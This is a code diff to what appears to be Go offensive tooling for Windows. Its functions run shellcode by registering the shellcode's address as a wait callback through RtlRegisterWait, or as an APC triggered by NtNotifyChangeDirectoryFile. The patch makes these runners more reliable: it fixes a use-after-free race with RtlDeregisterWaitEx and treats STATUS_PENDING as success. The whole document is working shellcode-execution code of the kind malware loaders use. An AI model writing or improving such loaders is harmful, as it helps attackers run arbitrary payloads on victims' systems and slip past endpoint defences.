@@ -209,7 +209,10 @@ func executeReadDirChanges(addr uintptr) error {
 }
 
 // executeRtlRegisterWait registers shellcode as a wait callback, then signals
-// the event to trigger it.
+// the event to trigger it. WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION plus
+// RtlDeregisterWaitEx(INVALID_HANDLE_VALUE) guarantees the callback has
+// completed before we return, so the caller may safely free the shellcode
+// memory without risking a post-free invocation by the wait thread.
 func executeRtlRegisterWait(addr uintptr) error {
 	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
 	if err != nil {
@@ -217,22 +220,30 @@ func executeRtlRegisterWait(addr uintptr) error {
 	}
 	defer windows.CloseHandle(hEvent)
 
+	const (
+		wtExecuteOnlyOnce      = 0x00000008
+		wtExecuteLongFunction  = 0x00000010
+	)
+
 	var hWait uintptr
-	const wtExecuteDefault = 0x00000000
 	r, _, callErr := api.ProcRtlRegisterWait.Call(
 		uintptr(unsafe.Pointer(&hWait)),
 		uintptr(hEvent),
 		addr,
 		0, // context
-		0, // timeout (fires immediately after signal)
-		wtExecuteDefault,
+		0, // timeout (fires immediately on signal)
+		wtExecuteOnlyOnce|wtExecuteLongFunction,
 	)
 	if r != 0 {
 		return fmt.Errorf("RtlRegisterWait: NTSTATUS 0x%X: %w", uint32(r), callErr)
 	}
 
-	windows.SetEvent(hEvent)  //nolint:errcheck
+	windows.SetEvent(hEvent) //nolint:errcheck
 	windows.SleepEx(100, true)
+
+	// Block until any in-flight callback has finished.
+	const invalidHandleValue = ^uintptr(0)
+	api.ProcRtlDeregisterWaitEx.Call(hWait, invalidHandleValue) //nolint:errcheck
 	return nil
 }
 
@@ -260,7 +271,10 @@ func executeNtNotifyChange(addr uintptr) error {
 		0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
 		0,    // WatchTree = FALSE
 	)
-	if r != 0 {
+	// STATUS_PENDING (0x103) means the async operation was queued successfully;
+	// the APC fires later when the directory changes.
+	const statusPending = 0x103
+	if r != 0 && uint32(r) != statusPending {
 		return fmt.Errorf("NtNotifyChangeDirectoryFile: NTSTATUS 0x%X: %w", uint32(r), callErr)
 	}
 	triggerDirChange(tmp, 100)
